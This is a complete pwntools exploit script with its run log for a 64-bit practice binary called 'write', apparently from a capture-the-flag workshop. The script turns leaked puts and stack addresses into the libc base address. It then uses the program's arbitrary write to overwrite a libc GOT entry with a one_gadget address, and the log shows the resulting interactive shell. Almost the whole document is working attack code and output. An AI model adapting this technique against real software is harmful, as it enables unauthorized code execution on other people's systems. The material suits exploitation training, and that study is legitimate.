#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# $ pwn template ./write
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./write')
libc = ELF('libc-2.27.so')

context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./exploit.py GDB
gdbscript = '''

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil('puts: ')
puts_address = int(io.recvuntil('\n')[:-1], 16)
io.recvuntil('stack: ')
stack_address = int(io.recvuntil('\n')[:-1], 16)
io.recvuntil('(q)uit\n')

print('[*] Puts address: ' + hex(puts_address))
print('[*] Stack address: ' + hex(stack_address))

libc_base = puts_address - libc.symbols['puts']
print('[*] puts offset: ' + hex(libc.symbols['puts']))
print('[*] Libc base address: ' + hex(libc_base))

io.sendline('w')
io.recvuntil('ptr: ')

libc_abs_got = puts_address + 0x36a6e8 - 0x8*4

print('[*] libc abs got overwrite: ' + hex(libc_abs_got))

io.sendline(str(libc_abs_got))
io.recvuntil('val: ')

gadget_offsets = list(map(int, '324293 324386 939679 940120 940127 940131 1090444 1090456'.split()))
one_gadget = gadget_offsets[int(args.X)] + libc_base

io.sendline(str(one_gadget))

io.interactive()

'''
$ python3 exploit.py X=1
[*] '/mnt/hgfs/LEARN/pwn-workshop-bytebandit/write/write'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/mnt/hgfs/LEARN/pwn-workshop-bytebandit/write/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/mnt/hgfs/LEARN/pwn-workshop-bytebandit/write/write': pid 106477
[*] Puts address: 0x7f9fa8b6a9c0
[*] Stack address: 0x7ffd3b6c7808
[*] puts offset: 0x809c0
[*] Libc base address: 0x7f9fa8aea000
[*] libc abs got overwrite: 0x7f9fa8ed5088
[*] Switching to interactive mode
===Menu===
(w)rite
(q)uit
$ ls
core  exploit.py  libc-2.27.so    write
$
'''